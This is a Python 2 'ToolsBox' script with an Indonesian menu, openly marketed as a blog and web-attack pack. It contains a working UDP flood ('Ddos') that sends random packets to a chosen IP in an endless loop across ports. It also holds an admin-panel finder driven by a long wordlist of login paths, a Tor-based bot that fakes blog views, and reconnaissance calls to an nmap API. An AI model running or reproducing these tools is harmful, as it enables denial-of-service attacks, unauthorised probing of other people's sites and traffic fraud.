# -*- coding:utf-8 -*-
import os, sys,socket
from bs4 import BeautifulSoup
from urllib import urlopen as o
import requests
import random
import httplib
from datetime import datetime
import time
from torrequest import TorRequest
os.system('clear')

r = '\033[1;31m'
g = '\033[92;1m'
y = '\033[1;33m'
c = '\033[34;1m'
w = '\033[1;37m'
n = '\033[0;00m'
br = '\033[91;7m'
a = '\033[90m'

def atas():
  logo = a+'''
 ______          _____   ______'''+r+'''  | '''+g+'''CapthaCode404_'''+a+'''
 |_____] |      |     | |  ____'''+r+'''  | '''+g+'''- DeveloperSec45'''+a+'''
 |_____] |_____ |_____| |_____|'''+r+'''  | '''+g+'''   - BlackCoderCrush'''+w+'''
                 ToolsBox [ '''+y+'''1.1'''+w+''' ] 
'''
  print logo
  print y+'    ['+a+'_____'+r+'Tools Pack Untuk Blog 2020'+a+'_____'+y+']'
def menu():
  menu = w+'''

    #>Visitor
        |__> 1) '''+y+'''AutoVisitor'''+w+'''
        |__> 2) '''+y+'''Jingling Web Orang ( Attack ) '''+c+'''// Premium Tools'''+w+'''
    '''+g+'''<'''+r+'''+'''+a+'''---------------------------------'''+r+'''+'''+g+'''>'''+w+'''
     #>InfoBlog
        |__> 3) '''+y+'''All_Info_Web'''+w+'''
        |__> 4) '''+y+'''TCP Port Scan'''+w+'''
        |__> 5) '''+y+'''Check Header'''+w+'''
    '''+g+'''<'''+r+'''+'''+a+'''---------------------------------'''+r+'''+'''+g+'''>'''+w+'''
     #>Setting Blog
        |__> 6) '''+y+'''Hilangkan ?m=1 di web'''+w+'''
        |__> 7) '''+y+'''Hilangkan Tanggal Dan Waktu'''+w+'''
    '''+g+'''<'''+r+'''+'''+a+'''---------------------------------'''+r+'''+'''+g+'''>'''+w+'''
     #>Web Ataccking
        |__> 8) '''+y+'''Ddos'''+w+'''
        |__> 9) '''+y+'''Bug Finder '''+c+'''//Premium'''+w+'''
        |__> 10) '''+y+'''Admin Finder'''+w+'''
        |__> 11) '''+y+'''Dorker Tools '''+c+'''//Premium'''+w+'''
    '''+g+'''<'''+r+'''+'''+a+'''---------------------------------'''+r+'''+'''+g+'''>'''+w+'''
     #>Tools Info
        |__> 12) '''+y+'''About Tools'''+w+'''
        |__> 13) '''+y+'''Contact'''+w+'''
    '''+g+'''<'''+r+'''+'''+a+'''---------------------------------'''+r+'''+'''+g+'''>'''
  print menu
  men_in = raw_input(g+'Pilih Tools :'+y)
  if men_in == "1":
    headers = {	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"}
    proxyPort=9050
    ctrlPort=9051
    site = raw_input("Enter your Blog Address : ")
    blog = input("Enter The number of Viewers : ")
    def run():
         response = tr.get(site, headers=headers,verify=False)
         print g+"["+str(i)+"]" + " Blog View Added With IP:"+tr.get('http://ipecho.net/plain').content
         tr.reset_identity()
    if __name__ == '__main__':
	    if len(sys.argv) > 3:
	       if sys.argv[1] and sys.argv[2]:
		    proxyPort=sys.argv[1]
		    ctrlPort=sys.argv[2]	
	    with TorRequest(proxy_port=proxyPort, ctrl_port=ctrlPort, password=None) as tr:
	        for i in range(blog):
		      run()
  elif men_in =="3":
    print y+'Don Use Https/http'
    target = raw_input(g+'#> '+w)
    def ip():
      try: 
        IP = socket.gethostbyname(target) 
        print "IP address of " +g+ target +w+ " is " +g+ IP +w
      except socket.gaierror: 
        print "Unable to resolve " + target
    
    def http():
      page = o('https://api.hackertarget.com/httpheaders/?q='+target).read()
      print page

    def dns():
      page = o('https://api.hackertarget.com/dnslookup/?q='+target).read()
      print page
    def geo():
      IP = socket.gethostbyname(target)
      page = o('https://api.hackertarget.com/geoip/?q='+IP).read()
      print page
    print '''
  <-----------IP WEB / BLOG----------->'''
    ip()
    print '''
  <-----------PORT----------->'''
    print w+target+g+':80'+w
    print '''
  <-----------HTTP Header----------->'''+g
    http()
    print w+'''
  <-----------Domain Name Server----------->'''+g
    dns()
    print w+'''
  <-----------Geo Ip----------->'''+g
    geo()
#4####
  if men_in == "4":
    print y+'Don Use Https/http'
    target = raw_input(g+'#> '+w)
    page = o('https://api.hackertarget.com/nmap/?q='+target).read() 
    print g+page
#5###
  if men_in == "5":
    print y+'Don Use Https/http'
    target = raw_input(g+'#> '+w)
    page = o('https://api.hackertarget.com/httpheaders/?q='+target).read()
    print
    print g+page
##6###
  if men_in == "6":
    print y+('Masukan Lokasi Template Blog Anda')
    path = raw_input(g+'#>'+w)

    template = open(path, "r+")
    ganti = '''<script type='text/javascript'>
var uri = window.location.toString(); if (uri.indexOf("%3D","%3D") > 0) {var clean_uri = uri.substring(0, uri.indexOf("%3D")); window.history.replaceState({}, document.title, clean_uri);}var uri = window.location.toString();if (uri.indexOf("%3D%3D","%3D%3D") > 0) {var clean_uri = uri.substring(0, uri.indexOf("%3D%3D")); window.history.replaceState({}, document.title, clean_uri);}
var uri = window.location.toString(); if (uri.indexOf("&m=1","&m=1") > 0) {var clean_uri = uri.substring(0, uri.indexOf("&m=1")); window.history.replaceState({}, document.title, clean_uri);}
var uri = window.location.toString();if (uri.indexOf("?m=1","?m=1") > 0) {var clean_uri = uri.substring(0, uri.indexOf("?m=1")); window.history.replaceState({}, document.title, clean_uri);}
</script></body>'''
    hm = template.read().replace('</body>', ganti)
    al = open('hasil_hilang_m1.xml', 'w')
    al.write(hm)
    al.close()
    template.close()
    print w+'['+g+'√'+w+']'+a+'Success Saved '+g+'hasil_hilang_m1.xml'+a+', Upload (hasil_hilang_m1.xml) ke blog'
  
  if men_in == "7":
    print y+('Masukan Lokasi Template Blog Anda')
    path = raw_input(g+'#>'+w)

    template = open(path, "r+")
    ganti = '''<script type='text/javascript'>
//<![CDATA[
// BloggerJS v0.3.1
// Copyright (c) 2017-2018 Kenny Cruz
// Licensed under the MIT License
var urlTotal,nextPageToken,postsDatePrefix=!1,accessOnly=!1,useApiV3=!1,apiKey="",blogId="",postsOrPages=["pages","posts"],jsonIndex=1,secondRequest=!0,feedPriority=0,amp="&amp;"[0];function urlVal(){var e=window.location.pathname,t=e.length;return".html"===e.substring(t-5)?0:t>1?1:2}function urlMod(){var e=window.location.pathname;"p"===e.substring(1,2)?(e=(e=e.substring(e.indexOf("/",1)+1)).substr(0,e.indexOf(".html")),history.replaceState(null,null,"../"+e)):(e=(e=postsDatePrefix?e.substring(1):e.substring(e.indexOf("/",7)+1)).substr(0,e.indexOf(".html")),history.replaceState(null,null,"../../"+e))}function urlSearch(e,t){var n=e+".html";t.forEach(function(e){-1!==e.search(n)&&(window.location=e)})}function urlManager(){var e=urlVal();0===e?accessOnly||urlMod():1===e?getJSON(postsOrPages[feedPriority],1):2===e&&(accessOnly||history.replaceState(null,null,"/"))}function getJSON(e,t){var n=document.createElement("script");if(useApiV3){var o="https://www.googleapis.com/blogger/v3/blogs/"+blogId+"/"+e+"?key="+apiKey+"#maxResults=500#fields=nextPageToken%2Citems(url)#callback=bloggerJSON";nextPageToken&&(o+="#pageToken="+nextPageToken),nextPageToken=void 0}else o=window.location.protocol+"//"+window.location.hostname+"/feeds/"+e+"/default?start-index="+t+"#max-results=150#orderby=published#alt=json-in-script#callback=bloggerJSON";o=o.replace(/#/g,amp),n.type="text/javascript",n.src=o,document.getElementsByTagName("head")[0].appendChild(n)}function bloggerJSON(e){var t=[];if(useApiV3||void 0===urlTotal&&(urlTotal=parseInt(e.feed.openSearch$totalResults.$t)),useApiV3){try{e.items.forEach(function(e,n){t.push(e.url)})}catch(e){}nextPageToken=e.nextPageToken}else try{e.feed.entry.forEach(function(n,o){var r=e.feed.entry[o];r.link.forEach(function(e,n){"alternate"===r.link[n].rel&&t.push(r.link[n].href)})})}catch(e){}urlSearch(window.location.pathname,t),urlTotal>150?(jsonIndex+=150,urlTotal-=150,getJSON(postsOrPages[feedPriority],jsonIndex)):nextPageToken?getJSON(postsOrPages[feedPriority]):secondRequest&&(nextPageToken=void 0,urlTotal=void 0,jsonIndex=1,secondRequest=!1,0===feedPriority?(feedPriority=1,getJSON("posts",1)):1===feedPriority&&(feedPriority=0,getJSON("pages",1)))}function bloggerJS(e){e&&(feedPriority=e),urlManager()}bloggerJS();
//]]>
</script></body>'''
    hm = template.read().replace('</body>', ganti)
    al = open('hasil_hilang_m1.xml', 'w')
    al.write(hm)
    al.close()
    template.close()
    print w+'['+g+'√'+w+']'+a+'Success Saved '+g+'hasil_hilang_m1.xml'+a+', Upload (hasil_hilang_m1.xml) ke blog'
  if men_in == "8":
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = raw_input(g+"IP Target : "+w)
    port = input(g+"Port       : "+w)
    sent = 0
    while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print g+"Kirim %s Virus Ke %s Dengan Port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1

  if men_in == "10": 
    url = raw_input(g+'Target : '+w)
    passe = ('admin/','administrator/','login.php','administration/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','adminLogin/','admin_area/','panel-administracion/','instadmin/','login.aspx',
'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx','memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi','admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf','cpanel','cpanel.php','cpanel.html',)
    for hani in passe :
      curl = url+hani
      web = requests.get(curl)
      if web.status_code==404:
        print curl+y+'  ['+r+'X'+y+']'+r+'Gak Di Temukan /Not Found'+w
      elif web.status_code==200:
        print curl+y+'  ['+g+'√'+y+']'+g+'Ditemukan / 200ok'+w
        os.system('sleep 3.6')

  if men_in=="12":
    about = r+"""
</"""+g+"""-----------------ABOUT-----------------"""+r+"""/>"""+w+"""
    Created by     : CapthaCode404_
    Tools          : Blog Tools Pack
    Version        : 1.1
    Premium        : Hub +6283870386264
    Thanks To      : Developer Security45 - BlackCoderCrush"""+r+"""
</"""+g+"""-----------------ABOUT-----------------"""+r+"""/>"""

    print about
  if men_in == "13":
    os.system('xdg-open https://wa.me/6283870386264')
atas()
menu()

